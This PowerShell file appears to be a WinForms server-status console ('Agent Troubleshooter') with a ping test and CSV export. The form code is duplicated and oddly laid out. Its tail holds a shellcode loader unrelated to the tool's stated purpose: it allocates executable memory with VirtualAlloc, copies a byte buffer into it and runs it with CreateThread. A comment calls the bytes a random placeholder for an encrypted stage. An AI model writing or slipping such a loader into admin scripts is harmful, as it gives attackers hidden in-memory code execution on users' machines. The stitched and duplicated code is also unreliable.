<#
.SYNOPSIS
    Small WinForms console that checks the state of the configured servers.
.DESCRIPTION
    Builds the form in code, wires the button handlers and keeps the last result
    set in memory so it can be exported to CSV from the toolbar.
.EXAMPLE
    .\Open-OpsTool.ps1
#>

$ErrorActionPreference = 'Stop'



Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Agent Troubleshooter'
$form.Size = New-Object System.Drawing.Size(640, 520)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('dc02', 'web-stg-01', 'mgmt01', 'dc01')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$form = New-Object System.Windows.Forms.Form
$form.Text = 'Agent Troubleshooter'
$form.Size = New-Object System.Drawing.Size(640, 520)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('dc02', 'web-stg-01', 'mgmt01', 'dc01')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = 'Test'
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)

$grid = New-Object System.Windows.Forms.DataGridView
$grid.Location = New-Object System.Drawing.Point(18, 96)
$grid.Size = New-Object System.Drawing.Size(700, 300)
$grid.ReadOnly = $true
$grid.AllowUserToAddRows = $false
$grid.AutoSizeColumnsMode = 'Fill'
$form.Controls.Add($grid)

$table = New-Object System.Data.DataTable
[void]$table.Columns.Add('Server')
[void]$table.Columns.Add('Status')
[void]$table.Columns.Add('CheckedAt')
foreach ($server in $script:servers) {
    [void]$table.Rows.Add($server, 'Unknown', (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))
}
$grid.DataSource = $table

$saveButton = New-Object System.Windows.Forms.Button
$saveButton.Text = 'Export CSV'
$saveButton.Location = New-Object System.Drawing.Point(18, 410)
$saveButton.Size = New-Object System.Drawing.Size(120, 28)
$saveButton.Add_Click({
    $dialog = New-Object System.Windows.Forms.SaveFileDialog
    $dialog.Filter = 'CSV files (*.csv)|*.csv'
    $dialog.FileName = "health-export.csv"
    if ($dialog.ShowDialog() -eq 'OK') {
        $table | Export-Csv -Path $dialog.FileName -NoTypeInformation -Encoding UTF8
        $statusLabel.Text = 'Exported'
    }
})
$form.Controls.Add($saveButton)

$menu = New-Object System.Windows.Forms.MenuStrip
$fileMenu = New-Object System.Windows.Forms.ToolStripMenuItem
$fileMenu.Text = 'File'
$exitItem = New-Object System.Windows.Forms.ToolStripMenuItem
$exitItem.Text = 'Exit'
$exitItem.Add_Click({ $form.Close() })
[void]$fileMenu.DropDownItems.Add($exitItem)
[void]$menu.Items.Add($fileMenu)
$form.Controls.Add($menu)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 120000
$timer.Add_Tick({
    $statusLabel.Text = 'Last refresh: ' + (Get-Date).ToString('HH:mm:ss')
})
$timer.Start()

$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()

Write-Host ("Console closed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -ForegroundColor DarkGray

$form.KeyPreview = $true
$form.Add_KeyDown({
    if ($_.KeyCode -eq 'Escape') { $form.Close() }
})

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x1d, 0xe3, 0xc4, 0x7a, 0xbd, 0x2a, 0xc0, 0x46, 0x86, 0x86, 0x89, 0x02, 0x42, 0xd8, 0xe6, 0xa8,
    0xce, 0xfc, 0x38, 0xd5, 0x54, 0x28, 0xa0, 0x7e, 0x30, 0x2b, 0x6f, 0x8d, 0x99, 0xb9, 0x23, 0xda,
    0xeb, 0xc2, 0xa5, 0x1b, 0x88, 0xb6, 0xd7, 0xfa, 0x70, 0x1f, 0xa3, 0x9e, 0x69, 0x8b, 0x40, 0x01,
    0xfd, 0xe8, 0x2d, 0x92, 0xf2, 0xb8, 0xc4, 0x20, 0x10, 0x67, 0x1d, 0xda, 0x8b, 0xc8, 0x19, 0x22,
    0xc1, 0x5e, 0x1a, 0xf9, 0x74, 0xf5, 0x3e, 0x0d, 0x44, 0x3b, 0xd9, 0xb1, 0xfc, 0x9d, 0xc1, 0xac,
    0xf9, 0x35, 0xec, 0x7e, 0xfb, 0xb2, 0xc4, 0xc7, 0x95, 0xf5, 0x99, 0x88, 0x54, 0x32, 0xa2, 0x26,
    0x2f, 0xa3, 0x31, 0x56, 0xc8, 0xbd, 0x8c, 0xd4, 0xe3, 0xec, 0x28, 0x13, 0x92, 0x90, 0x58, 0x39,
    0xb7, 0x38, 0xe8, 0x56, 0xaa, 0xb1, 0xc6, 0xfa, 0x3b, 0x37, 0xaf, 0xce, 0xe6, 0x05, 0xad, 0x41,
    0xea, 0xb3, 0xb7, 0xb8, 0xe2, 0x60, 0x4b, 0x5e, 0xaa, 0x09, 0xb2, 0xb6, 0x56, 0x28, 0x41, 0x9a,
    0xe5, 0xaf, 0x9d, 0x45, 0x22, 0x43, 0xb1, 0x3a, 0xa3, 0x8c, 0x59, 0xfe, 0x54, 0xfb, 0xa4, 0x62,
    0x81, 0xe8, 0x82, 0x1f, 0x1c, 0x9f, 0x7c, 0xb0, 0xcb, 0xb2, 0x24, 0x9a, 0xbc, 0xa7, 0xa1, 0x64,
    0xfd, 0x57, 0x7f, 0x22, 0xc5, 0xc9, 0xb7, 0xd0, 0x64, 0x18, 0xa1, 0x8e, 0x7c, 0x1c, 0x91, 0x6c,
    0x5a, 0xbd, 0xc4, 0x64, 0x33, 0xcd, 0xed, 0x44, 0xbb, 0x81, 0x12, 0x68, 0xb5, 0xab, 0x53, 0x78,
    0x14, 0x86, 0x01, 0x7f, 0x24, 0x35, 0x41, 0xd0, 0x30, 0xf5, 0xac, 0xf6, 0x55, 0x34, 0x6a, 0x49,
    0xfa, 0xbd, 0x22, 0x38, 0x95, 0x21, 0xb0, 0x03, 0x75, 0x67, 0xc2, 0x6f, 0x9c, 0x59, 0x1f, 0x67,
    0x32, 0x5e, 0x78, 0x61, 0x22, 0x3a, 0x8e, 0xc0, 0xcc, 0xa4, 0xc3, 0x5d, 0xa0, 0x60, 0x4d, 0xa8,
    0xa9, 0x66, 0xea, 0xac, 0x84, 0xcb, 0x71, 0xcb, 0x5d, 0x83, 0xe7, 0x09, 0x2c, 0xda, 0x56, 0x2d,
    0x8f, 0x98, 0x25, 0x12, 0x3e, 0x00, 0x05, 0xb7, 0xe9, 0x4b, 0x9d, 0x7d, 0x70, 0x53, 0x3a, 0xcf,
    0x87, 0x5d, 0xfd, 0xd1, 0x13, 0xba, 0x03, 0xaf, 0x4f, 0x81, 0x5b, 0x39, 0x2c, 0x1f, 0x0b, 0x37,
    0xca, 0x3f, 0xb2, 0x9d, 0xbd, 0x66, 0xa6, 0xfa, 0xd5, 0xa2, 0x0c, 0x45, 0x10, 0x15, 0x6f, 0x46,
    0x7b, 0x13, 0x15, 0xba, 0x09, 0xf7, 0x6e, 0x8d, 0x35, 0x93, 0xe7, 0x3e, 0x41, 0x05, 0xa3, 0x1b,
    0x70
)

$BufferAddress = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 2896)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
